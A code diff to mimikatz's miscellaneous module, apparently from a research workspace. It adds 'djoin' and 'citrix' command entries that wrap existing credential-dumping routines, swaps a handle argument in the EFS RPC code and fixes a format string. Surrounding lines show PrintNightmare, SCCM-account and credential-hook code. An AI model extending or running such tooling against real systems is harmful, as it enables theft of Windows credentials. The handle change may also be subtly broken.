@@ -1,4 +1,4 @@
-# 1 "project/mimikatz/mimikatz/modules/kuhl_m_misc.c"
+# 1 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/kuhl_m_misc.c"
 
 
 
@@ -33,6 +33,8 @@ const KUHL_M_C kuhl_m_c_misc[] = {
  {kuhl_m_misc_printnightmare, L"printnightmare", NULL},
  {kuhl_m_misc_sccm_accounts, L"sccm", NULL},
  {kuhl_m_misc_shadowcopies, L"shadowcopies", NULL},
+ {kuhl_m_misc_djoin_proxy, L"djoin", NULL},
+ {kuhl_m_misc_citrix_proxy, L"citrix", NULL},
 };
 const KUHL_M kuhl_m_misc = {
  L"misc", L"Miscellaneous module", NULL,
@@ -239,7 +241,7 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
  }
  return status;
 }
-# 466 "project/mimikatz/mimikatz/modules/kuhl_m_misc.c"
+# 468 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/kuhl_m_misc.c"
 typedef NTSTATUS (NTAPI * PSPACCEPTCREDENTIALS)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
 typedef FILE * (__cdecl * PFOPEN)(__in_z const char * _Filename, __in_z const char * _Mode);
 typedef int (__cdecl * PFWPRINTF)(__inout FILE * _File, __in_z __format_string const wchar_t * _Format, ...);
@@ -857,7 +859,7 @@ NTSTATUS kuhl_m_misc_clip(int argc, wchar_t * argv[])
  }
  else PRINT_ERROR_AUTO(L"RegisterClassEx");
  return STATUS_SUCCESS;
-# 1129 "project/mimikatz/mimikatz/modules/kuhl_m_misc.c"
+# 1131 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/kuhl_m_misc.c"
  return STATUS_SUCCESS;
 
 }
@@ -1283,11 +1285,11 @@ NTSTATUS kuhl_m_misc_efs(int argc, wchar_t * argv[])
           else if(ret == 0)
           {
            PRINT_ERROR(L"EfsRpcOpenFileRaw is a success, really? (not normal)\n");
-           EfsRpcCloseRaw(&hEfsHandle);
+           EfsRpcCloseRaw(&hImportCtx);
           }
           else
           {
-           PRINT_ERROR(L"EfsRpcOpenFileRaw: ", ret);
+           PRINT_ERROR(L"EfsRpcOpenFileRaw: %u\n", ret);
           }
          }
          RpcExcept(RPC_EXCEPTION)
@@ -1915,5 +1917,17 @@ NTSTATUS kuhl_m_misc_shadowcopies(int argc, wchar_t * argv[])
  }
  else PRINT_ERROR(L"NtOpenDirectoryObject: 0x%08x\n", status);
 
+ return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_misc_djoin_proxy(int argc, wchar_t * argv[])
+{
+ kuhl_m_misc_djoin(argc, argv);
+ return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_misc_citrix_proxy(int argc, wchar_t * argv[])
+{
+ kuhl_m_misc_citrix_logonpasswords(argc, argv);
  return STATUS_SUCCESS;
 }
